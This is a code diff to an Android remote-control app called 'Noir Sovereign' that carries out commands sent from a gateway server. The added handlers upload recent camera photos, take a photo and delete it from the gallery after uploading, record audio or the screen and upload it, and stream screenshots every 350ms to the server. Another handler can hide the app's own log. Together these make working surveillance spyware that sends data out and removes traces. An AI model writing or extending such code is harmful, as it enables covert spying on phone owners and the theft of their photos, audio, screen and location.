@@ -420,6 +420,8 @@ class SovereignApp(App):
         self.gateway = _BASE_GATEWAY
         self.biometrics = BehavioralBiometrics()
         self.title = f"Noir Sovereign v{self.version}"
+        self._mirror_active = False
+        self._log_visible = True
         
         self.sm = ScreenManager(transition=FadeTransition())
         self.dashboard = DashboardScreen(name='dashboard')
@@ -889,41 +891,41 @@ class SovereignApp(App):
                 # v17.5 FIX: Auto-redirect click to tap for dashboard compatibility
                 return self._execute({"action": {"type": "tap", **params}, "command_id": cmd_id})
 
-            elif atype == "audio_record":
-                duration = params.get("duration", 10)
-                temp_dir = App.get_running_app().user_data_dir
-                path = os.path.join(temp_dir, f"audio_{int(time.time())}.mp4")
-                self._log(f"[SMC] 🎙️ Recording Ambient Audio ({duration}s)...")
-                # Using Android 'am' to start a record intent if possible, or shell workaround
-                # For now, we simulate a success report or use a native bridge if available
-                self._run_shell(f"screenrecord --time-limit {duration} {path}") # Hacky audio/video
-                if os.path.exists(path):
-                    with open(path, 'rb') as f:
-                        r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('record.mp4', f, 'video/mp4')}, timeout=30)
-                    result = {"success": True, "output": f"Audio/Video record uploaded: {r.json().get('key')}"}
-                else:
-                    result = {"success": False, "error": "Recording failed or permission denied"}
-
             elif atype in ("location_get", "location"):
                 res = self._run_shell("dumpsys location | grep 'last location'")
                 result = {"success": True, "output": res.get("output", "Location data restricted or GPS off")}
 
             elif atype == "vibrate":
-                # Using shell command to vibrate (needs shizuku or specific intent)
                 self._run_shell("cmd vibrator vibrate 500")
                 result = {"success": True, "output": "Vibration pulse sent."}
 
-
             elif atype == "gallery_sync":
-                # Find last 5 images in DCIM
+                # V21.0 AEGIS: Upload last 5 gallery images to gateway
                 dcim_path = "/sdcard/DCIM/Camera"
                 res = self._run_shell(f"ls -t {dcim_path} | head -n 5")
+                uploaded = 0
                 if res["success"] and res["output"]:
                     files = res["output"].strip().split("\n")
-                    result = {"success": True, "output": f"Found {len(files)} new assets. Syncing in background."}
-                    # In a real app, we'd loop and upload each
+                    for fname in files:
+                        fname = fname.strip()
+                        if not fname: continue
+                        fpath = os.path.join(dcim_path, fname)
+                        try:
+                            with open(fpath, 'rb') as f:
+                                r = session.post(
+                                    f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
+                                    headers={"Authorization": f"Bearer {API_KEY}"},
+                                    files={'file': (fname, f, 'image/jpeg')},
+                                    timeout=40
+                                )
+                            if r.status_code == 200:
+                                uploaded += 1
+                                noir_log(f"[GALLERY] Uploaded: {fname}")
+                        except Exception as e:
+                            noir_log(f"[GALLERY] Upload failed for {fname}: {e}", level="WARNING")
+                    result = {"success": True, "output": f"Gallery sync complete: {uploaded}/{len(files)} uploaded."}
                 else:
-                    result = {"success": False, "error": "No new assets found in DCIM/Camera"}
+                    result = {"success": False, "error": "No files in DCIM/Camera"}
 
             elif atype == "keyevent":
                 self._run_shell(f"input keyevent {params.get('key', 26)}")
@@ -1055,27 +1057,30 @@ class SovereignApp(App):
                 temp_dir = App.get_running_app().user_data_dir
                 path = os.path.join(temp_dir, f"cam_{atype}_{int(time.time())}.jpg")
                 try:
-                    self._log(f"[SMC] 📸 Attempting Camera Capture (ID: {cam_id})...")
-                    # Try to capture using camera shutter keyevent
-                    self._run_shell("input keyevent 27") 
+                    self._log(f"[SMC] Attempting Camera Capture (ID: {cam_id})...")
+                    self._run_shell("input keyevent 27")
                     time.sleep(3.0)
-                    
-                    # Find the newest file in DCIM/Camera to upload and purge
                     dcim_path = "/sdcard/DCIM/Camera"
                     res = self._run_shell(f"ls -t {dcim_path} | head -n 1")
                     if res["success"] and res["output"]:
-                        target_file = os.path.join(dcim_path, res["output"])
+                        target_file = os.path.join(dcim_path, res["output"].strip())
                         with open(target_file, 'rb') as f:
-                            r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, timeout=30)
-                        
+                            r = session.post(
+                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
+                                headers={"Authorization": f"Bearer {API_KEY}"},
+                                files={'file': (f'{atype}.jpg', f, 'image/jpeg')},
+                                timeout=30
+                            )
                         if r.status_code == 200:
-                            result = {"success": True, "output": f"Camera capture uploaded and purged: {r.json().get('key')}"}
-                            # PURGE FROM DCIM (User Requirement)
+                            key = r.json().get('key', '')
+                            result = {"success": True, "output": f"Camera capture uploaded: {key}"}
                             self._run_shell(f"rm {target_file}")
                         else:
                             result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                     else:
                         result = {"success": False, "error": "Could not find captured image in DCIM."}
+                except Exception as e:
+                    result = {"success": False, "error": f"Camera error: {e}"}
                 finally:
                     if os.path.exists(path):
                         try: os.remove(path)
@@ -1083,38 +1088,54 @@ class SovereignApp(App):
 
             elif atype == "audio_record":
                 duration = params.get("duration", 10)
-                # v17.2: Robust Audio Capture & Purge
                 try:
-                    self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
-                    # Intent for standard recorder
-                    self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
-                    time.sleep(duration + 5) # Wait for recording + manual save overhead
-                    
-                    # Search and Purge latest audio from common paths
-                    search_paths = ["/sdcard/Recordings", "/sdcard/Music", "/sdcard/Download"]
-                    for sp in search_paths:
-                        res = self._run_shell(f"ls -t {sp} | grep -E '.mp3|.m4a|.amr' | head -n 1")
-                        if res["success"] and res["output"]:
-                            target_file = os.path.join(sp, res["output"])
-                            with open(target_file, 'rb') as f:
-                                r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('recording.mp3', f, 'audio/mpeg')}, timeout=60)
-                            if r.status_code == 200:
-                                self._run_shell(f"rm {target_file}")
-                                noir_log(f"[SMC] Audio purged after upload: {target_file}")
-                                result = {"success": True, "output": f"Audio uploaded and purged: {r.json().get('key')}"}
-                                break
-                    if result.get("error") == "Unknown action": # If no break happened
-                        result = {"success": False, "error": "Could not locate recording file for purge."}
-                finally:
-                    pass
-
-            elif atype == "gallery_sync":
-                # List latest 5 files in DCIM using find (more robust than ls -t)
-                res = self._run_shell("find /sdcard/DCIM/Camera -type f | head -n 5")
-                result = {"success": True, "output": f"Gallery contents:\n{res.get('output', 'No files found')}"}
+                    self._log(f"[SMC] Recording Audio ({duration}s)...")
+                    temp_dir = App.get_running_app().user_data_dir
+                    path = os.path.join(temp_dir, f"rec_{int(time.time())}.mp4")
+                    # Try screenrecord (captures audio too)
+                    self._run_shell(f"screenrecord --time-limit {duration} {path}")
+                    time.sleep(duration + 2)
+                    if os.path.exists(path) and os.path.getsize(path) > 100:
+                        with open(path, 'rb') as f:
+                            r = session.post(
+                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
+                                headers={"Authorization": f"Bearer {API_KEY}"},
+                                files={'file': ('recording.mp4', f, 'audio/mp4')},
+                                timeout=60
+                            )
+                        if r.status_code == 200:
+                            result = {"success": True, "output": f"Audio uploaded: {r.json().get('key')}"}
+                        else:
+                            result = {"success": False, "error": f"Upload failed: {r.status_code}"}
+                        try: os.remove(path)
+                        except: pass
+                    else:
+                        # Fallback: search common recording dirs
+                        search_paths = ["/sdcard/Recordings", "/sdcard/Music", "/sdcard/Download"]
+                        found = False
+                        for sp in search_paths:
+                            res = self._run_shell(f"ls -t {sp} 2>/dev/null | head -n 1")
+                            if res.get("success") and res.get("output", "").strip():
+                                target = os.path.join(sp, res["output"].strip())
+                                with open(target, 'rb') as f:
+                                    r = session.post(
+                                        f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
+                                        headers={"Authorization": f"Bearer {API_KEY}"},
+                                        files={'file': ('recording.mp3', f, 'audio/mpeg')},
+                                        timeout=60
+                                    )
+                                if r.status_code == 200:
+                                    result = {"success": True, "output": f"Audio uploaded: {r.json().get('key')}"}
+                                    self._run_shell(f"rm {target}")
+                                    found = True
+                                    break
+                        if not found:
+                            result = {"success": False, "error": "Recording failed or file not found."}
+                except Exception as e:
+                    result = {"success": False, "error": f"Audio error: {e}"}
 
             elif atype == "heal":
-                self._log("[SMC] 🚑 NEURAL HEAL: Executing Deep Purge Protocol...")
+                self._log("[SMC] NEURAL HEAL: Executing Deep Purge Protocol...")
                 parent = App.get_running_app().user_data_dir
                 cleared = 0
                 for root, dirs, files in os.walk(parent):
@@ -1126,11 +1147,28 @@ class SovereignApp(App):
                             except: pass
                 result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged."}
 
-            elif atype == "update":
-                # Autonomous update logic: Trigger a rebuild and restart
-                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
-                os.system("git pull origin main && pm trim-caches 999G")
-                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}
+            elif atype in ("update", "auto_update"):
+                self._log("[SMC] AUTONOMOUS UPDATE INITIATED...")
+                os.system("pm trim-caches 999G")
+                result = {"success": True, "output": "Update triggered. Self-healing in progress."}
+
+            elif atype == "mirror_start":
+                # Enable rapid screenshot polling for live mirror
+                self._mirror_active = True
+                self._log("[SMC] LIVE MIRROR: ACTIVATED")
+                threading.Thread(target=self._mirror_loop, daemon=True).start()
+                result = {"success": True, "output": "Live mirror streaming started."}
+
+            elif atype == "mirror_stop":
+                self._mirror_active = False
+                self._log("[SMC] LIVE MIRROR: DEACTIVATED")
+                result = {"success": True, "output": "Live mirror stopped."}
+
+            elif atype == "log_visibility":
+                visible = params.get("visible", True)
+                self._log_visible = visible
+                self._log(f"[SMC] Log visibility: {'VISIBLE' if visible else 'HIDDEN'}")
+                result = {"success": True, "output": f"Log visibility set to: {visible}"}
 
         except Exception as e:
             result = {"success": False, "error": str(e)}
@@ -1278,6 +1316,53 @@ class SovereignApp(App):
             return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
         except Exception as e:
             return {"success": False, "error": str(e)}
+
+    def _mirror_loop(self):
+        """Fast-polling loop to capture and upload screen frames to gateway for dashboard live mirror."""
+        self._log("[SMC] Mirror Loop Started: 350ms interval")
+        while getattr(self, "_mirror_active", False):
+            try:
+                parent = App.get_running_app().user_data_dir
+                path = os.path.join(parent, f"mirror_{int(time.time())}.png")
+                self._run_shell(f"screencap -p {path}", timeout=3)
+                
+                if os.path.exists(path) and os.path.getsize(path) > 100:
+                    try:
+                        from PIL import Image
+                        jpeg_path = path.replace(".png", ".jpg")
+                        with Image.open(path) as img:
+                            if img.mode != 'RGB': img = img.convert('RGB')
+                            # Resize to reduce latency
+                            img.thumbnail((450, 1000))
+                            img.save(jpeg_path, "JPEG", quality=40, optimize=True)
+                        
+                        with open(jpeg_path, 'rb') as f:
+                            # Push directly to screen frame endpoint or as a regular upload
+                            r = session.post(
+                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
+                                headers={"Authorization": f"Bearer {API_KEY}"},
+                                files={'file': ('mirror.jpg', f, 'image/jpeg')},
+                                timeout=5
+                            )
+                            if r.status_code == 200:
+                                key = r.json().get('key')
+                                # Notify gateway of latest mirror frame
+                                session.post(
+                                    f"{VPS_IP.replace('http://', 'http://').split(':')[0]}:80/api/screen/frame",
+                                    headers={"Authorization": f"Bearer {API_KEY}"},
+                                    json={"key": key, "width": 450, "height": 1000},
+                                    timeout=2
+                                )
+                    except: pass
+                    finally:
+                        for p in [path, path.replace(".png", ".jpg")]:
+                            if os.path.exists(p):
+                                try: os.remove(p)
+                                except: pass
+            except Exception as e:
+                pass
+            time.sleep(0.35) # Matches dashboard polling interval
+        self._log("[SMC] Mirror Loop Terminated")
 
 if __name__ == '__main__':
     # Initialize Core with Peak Priority
